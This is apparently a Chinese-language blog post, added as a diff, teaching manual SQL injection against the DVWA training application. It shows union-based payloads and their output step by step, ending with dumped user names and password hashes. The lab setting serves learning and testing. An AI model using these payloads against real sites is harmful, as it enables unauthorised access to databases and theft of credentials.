@@ -1,0 +1,122 @@
+#+BEGIN_HTML
+---
+layout: post
+title: 基础SQL注入
+description: sql注入简单练习。
+excerpt: ""
+categories: 安全
+tags: [sql]
+---
+#+END_HTML
+
+* 手工sql注入
+sql注入，就是用户通过浏览器提交的变量内容，后台应用程序对浏览器提交的内容并未进行检查过滤，
+直接拼接sql语句后去查询数据库，导致将数据库中的其它信息返回至用户界面中，造成数据库中其它
+未对用户授权的数据泄漏。
+
+** DVWA Sql注入学习
+测试sql语句
+: "SELECT first_name, last_name FROM users WHERE user_id = '$id';"
+*** 返回内容正常
+: ID: 1
+: First name: admin
+: Surname: admin
+*** 返回查询所有记录
+: ID: 1' or '1'='1
+: First name: admin
+: Surname: admin
+: ID: 1' or '1'='1
+: First name: Gordon
+: Surname: Brown
+: ID: 1' or '1'='1
+: First name: Hack
+: Surname: Me
+: ID: 1' or '1'='1
+: First name: Pablo
+: Surname: Picasso
+: ID: 1' or '1'='1
+: First name: Bob
+: Surname: Smith
+*** 判断有多少个字段，修改order by 后面的字段值，直到数据库报错
+: ID: 1' or 1=1 order by 2 #
+: First name: admin
+: Surname: admin
+: ID: 1' or 1=1 order by 2 #
+: First name: Gordon
+: Surname: Brown
+: ID: 1' or 1=1 order by 2 #
+: First name: Hack
+: Surname: Me
+: ID: 1' or 1=1 order by 2 #
+: First name: Pablo
+: Surname: Picasso
+: ID: 1' or 1=1 order by 2 #
+: First name: Bob
+: Surname: Smith
+: 执行结果说明，sql查询语句中只有两个字段
+*** 确定显示的字段顺序
+: ID: 1' union select 1,2 #
+: First name: admin
+: Surname: admin
+: ID: 1' union select 1,2 #
+: First name: 1
+: Surname: 2
+*** 获取当前数据库及版本
+: ID: 1' union select version(),database() #
+: First name: admin
+: Surname: admin
+: ID: 1' union select version(),database() #
+: First name: 10.1.26-MariaDB-0+deb9u1
+: Surname: dvwa
+: 从返回结果中我们可以看出数据库的名称和版本号
+*** 获取数据库中的表
+: ID: 1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
+: First name: admin
+: Surname: admin
+: ID: 1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
+: First name: 1
+: Surname: guestbook,users
+: 返回结果说明，数据库中存在了两张表为: guestbook,user
+*** 获取表字段名称
+: ID: 1' union select 1,group_concat(column_name) from information_schema.columns where table_name="users" #
+: First name: admin
+: Surname: admin
+: ID: 1' union select 1,group_concat(column_name) from information_schema.columns where table_name="users" #
+: First name: 1
+: Surname: user_id,first_name,last_name,user,password,avatar,last_login,failed_login
+*** 获取表中数据
+: ID: 1' union select group_concat(first_name),group_concat(password) from users #
+: First name: admin
+: Surname: admin
+: ID: 1' union select group_concat(first_name),group_concat(password) from users #
+: First name: admin,Gordon,Hack,Pablo,Bob
+: Surname: 5f4dcc3b5aa765d61d8327deb882cf99,e99a18c428cb38d5f260853678922e03,8d3533d75ae2c3966d7e0d4fcc69216b,0d107d09f5bbe40cade3de5c71e9e9b7,5f4dcc3b5aa765d61d8327deb882cf99
+:
+: 
+: ID: 1' union select last_name,password from users #
+: First name: admin
+: Surname: admin
+: ID: 1' union select last_name,password from users #
+: First name: admin
+: Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+: ID: 1' union select last_name,password from users #
+: First name: Brown
+: Surname: e99a18c428cb38d5f260853678922e03
+: ID: 1' union select last_name,password from users #
+: First name: Me
+: Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
+: ID: 1' union select last_name,password from users #
+: First name: Picasso
+: Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+: ID: 1' union select last_name,password from users #
+: First name: Smith
+: Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+
+#+BEGIN_HTML
+<!-- more-forword -->
+#+END_HTML
+
+
+#+BEGIN_HTML
+<!-- more -->
+#+END_HTML
